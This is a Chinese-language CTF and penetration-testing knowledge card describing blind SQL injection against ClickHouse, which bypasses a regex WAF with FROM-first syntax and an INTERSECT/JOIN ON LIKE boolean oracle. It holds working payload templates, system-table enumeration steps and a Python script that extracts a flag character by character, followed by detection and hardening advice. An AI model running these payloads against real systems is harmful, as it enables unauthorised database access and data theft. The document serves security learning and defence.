---
id: web-generic-sqli-clickhouse-from-first-intersect-join-blind
title: ClickHouse 盲注：FROM 前置 + INTERSECT/JOIN ON LIKE 绕过 select.*from 黑名单
type: scenario
domain: web
path: web/generic/sqli
technique: clickhouse-from-first-intersect-join-blind
aliases:
- ClickHouse SQL 注入
- FROM 前置
- INTERSECT 盲注
- JOIN ON LIKE 当 IF
- 绕过 select.*from
- id INTERSECT FROM
- ClickHouse FORMAT JSON 注入
tags:
- web
- sqli
- clickhouse
- waf-bypass
- blind-injection
- intersect
- join
- boolean
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V244
  verified_at: '2026-11-07T13:17:00+08:00'
  notes: 已对照原文与图片核对；ClickHouse报错泄露SQL、FROM前置、INTERSECT+JOIN ON LIKE布尔盲注与黑名单正则均一致；原文未给最终完整flag，卡片已注明；PoC未复跑
---

## 一句话结论

当 ClickHouse 后端把 `id` 直接拼进 `SELECT * FROM users WHERE id = {id} FORMAT JSON`，WAF 只用 `preg_match('/select.*from|\(|or|and|union|except/is',$id)` 做字符串黑名单时，可以利用 ClickHouse 允许 `FROM` 出现在 `SELECT` 之前的语法，构造 `id INTERSECT FROM <系统表> AS inject JOIN users ON inject.name LIKE '{pattern}' SELECT users.id,...`：前半个查询返回全部用户，后半个查询通过 `JOIN ... ON ... LIKE` 把条件当 IF 用；条件为真时两个查询的交集非空，响应包含 `User_x`，条件为假时交集为空。据此可用 BFS 逐字符爆破库名/表名/列名/flag，不出现 `select ... from`、`or`、`and`、`union`、`except` 等黑名单词。

## 原理

- **注入点**：后端 SQL 为 `SELECT * FROM users WHERE id = {user_input} FORMAT JSON`。`id=id` 时 `WHERE id = id` 恒真，返回全部用户；`id=name` 时报 `NO_COMMON_TYPE` 错误并回显完整 SQL，确认拼接点。
- **黑名单**：`select.*from` 被正则拦截（跨行/大小写不敏感），`(`、`or`、`and`、`union`、`except` 也被拦截；但 ClickHouse 的 `FROM` 子句可以写在 `SELECT` 前面（`FROM t SELECT ...`），因此可以完全避开 `select.*from`。
- **INTERSECT 构造布尔**：ClickHouse `INTERSECT` 返回两个查询结果集的交集，要求列数/类型/顺序一致。前一半 `SELECT users.id, users.name, users.email, users.age FROM users WHERE users.id = id` 返回所有用户；后一半用 `FROM system.databases AS inject JOIN users ON inject.name LIKE '{pattern}' SELECT users.id, users.name, users.email, users.age`——`JOIN ... ON` 的条件为真时，`system.databases` 每一行都与 `users` 笛卡尔/匹配，结果包含所有用户行；为假时交集为空。响应中 `User_5` 是否存在就是布尔真值。
- **为什么 `JOIN ON LIKE` 能当 IF**：ClickHouse 的 JOIN 支持非等值/表达式 ON 条件；`ON inject.name LIKE 'pattern'` 不要求列相等，条件为真则产生匹配行，为假则无匹配行。`system.databases`/`system.tables`/`system.columns` 作为可控的“驱动表”，其 `name` 字段用于匹配目标库/表/列名。
- **为什么不用 `AND`/`OR`**：黑名单拦截了这两个词；`INTERSECT` + `JOIN` 组合不需要它们。`(` 被拦截，因此不能用括号包裹子查询/函数；payload 中避免括号，`LIKE` 的字符串直接用单引号。
- **盲注脚本**：对目标字符串做前缀 `LIKE 'prefix%'` 判断，BFS/DFS 逐字符扩展；响应包含 `User_5` 为真，否则为假。原文脚本还会处理 ClickHouse 的 `MEMORY_LIMIT_EXCEEDED`（JOIN 产生大结果集）并重试。

## 触发条件

- 后端为 ClickHouse，用户输入直接拼接到 `WHERE id = ...` 等位置，未参数化；`FORMAT JSON` 等语法可被注入。
- WAF 黑名单只匹配字面量 `select.*from|\(|or|and|union|except`，未拦截 `INTERSECT`/`JOIN`/`FROM` 前置/`LIKE`。
- 攻击者能访问 `system.databases`/`system.tables`/`system.columns` 等系统表（ClickHouse 默认允许当前用户读取自身可见的元数据）。
- 目标表（如 `users`）有可区分的行（原文 `User_5`），用于判断交集是否非空。
- 响应差异可观测（JSON 结果/错误信息/长度），或可做时间盲注；原文用响应中是否出现 `User_5`。

## 利用步骤

1. 传 `id=1`/`id=2` 确认正常回显；传 `id=id` 返回所有用户，传 `id=name` 触发 `NO_COMMON_TYPE` 并泄露完整 SQL。
2. 构造库名爆破 payload：
   ```text
   id INTERSECT FROM system.databases AS inject JOIN users ON inject.name LIKE '{pattern}' SELECT users.id, users.name, users.email, users.age
   ```
   以 `prefix%` 判断库名前缀；命中时响应含 `User_5`。
3. 表名：把驱动表换成 `system.tables`，加 `WHERE inject.database='nepnep'`；列名：换成 `system.columns`，加 `WHERE inject.table='nepnep'`。
4. flag：目标表/列确定后（原文 `nepnep.nepnep` 的列 `51@g_ls_h3r3`），把 `inject.name LIKE` 改为目标列 `LIKE`，用 `NepCTF{` 前缀逐字符 BFS。
5. 处理 `MEMORY_LIMIT_EXCEEDED`：减少每次返回的行/列、加大延迟/重试，或改用更小的驱动表；原文脚本捕获该错误并等待重试。
6. 脚本输出完整 flag；原文最终得到 `NepCTF{5da4d58e-...}`（截图显示前缀爆破）。

## PoC

```python
import requests, time
URL = "http://target/"
payload_template = ("id INTERSECT FROM nepnep.nepnep AS inject "
                    "JOIN users ON inject.`51@g_ls_h3r3` LIKE '{pattern}' "
                    "SELECT users.id, users.name, users.email, users.age")

def check(prefix, exact=False):
    pattern = prefix if exact else prefix + "%"
    data = {"id": payload_template.format(pattern=pattern)}
    for _ in range(10):
        try:
            r = requests.post(URL, data=data, timeout=15)
            if "MEMORY_LIMIT_EXCEEDED" in r.text:
                time.sleep(5); continue
            return "User_5" in r.text
        except requests.RequestException:
            time.sleep(5)
    return False

# 逐字符 BFS/DFS（原文脚本）
prefix = "NepCTF{"
charset = "0123456789abcdef-}"
while True:
    for ch in charset:
        if check(prefix + ch):
            prefix += ch
            print(prefix)
            break
    else:
        break
```

原文使用 `system.databases` / `system.tables` / `system.columns` 三种模板分别爆破库/表/列，再切到目标表列；本卡未复跑。

## 变体与关联

- **时间盲注**：若响应内容不方便判断，可用 ClickHouse 的 `sleep`/`sleepEachRow` 函数做时间差；但黑名单可能拦函数括号，需要另找无括号写法。
- **错误盲注**：利用 `NO_COMMON_TYPE` 等错误信息回显构造布尔/枚举；原文先用它确认 SQL。
- **其他 ClickHouse 语法**：`ARRAY JOIN` 也可扩展 FROM 子句；`FROM` 前置同样可用于 `UNION`/`EXCEPT` 等被拦截语法的替代。
- **关联**：`[[pentest-lateral-movement-clickhouse-table-function-database-pivot]]`（ClickHouse 表函数横向）、`[[pentest-recon-clickhouse-system-table-credential]]`（系统表凭据）、`[[web-generic-sqli-django-postgis-raster-band-index]]`（其他数据库的 SQLi 绕过思路）。
- **边界**：ClickHouse 版本/权限影响 `system.*` 可读性与 JOIN 行为；若 WAF 同时拦截 `INTERSECT`/`JOIN`/`FROM` 前置，需要换用其他语法（如 `WHERE` 子查询/函数）。

## 检测与防御

- **代码修复**：使用参数化查询/ClickHouse 客户端绑定参数，禁止把用户输入拼进 SQL；对 `id` 做类型/白名单校验（只允许整数）。
- **WAF**：不要只做正则黑名单；解析 SQL 或至少拦截 `INTERSECT`、`JOIN`、`FROM` 前置、`LIKE` 注入、`system.` 等组合；对 `id` 参数只允许数字。
- **检测**：请求体中出现 `INTERSECT`、`FROM`、`JOIN`、`system.databases`、`system.tables`、`system.columns`、`LIKE` 与 `%` 组合；响应时间/大小异常、`NO_COMMON_TYPE`/`MEMORY_LIMIT_EXCEEDED` 错误；同一来源高频枚举字符。
- **加固**：ClickHouse 账号最小权限，禁止读取 `system.*` 中无关元数据；限制查询内存/超时；对异常 SQL 记录审计日志。
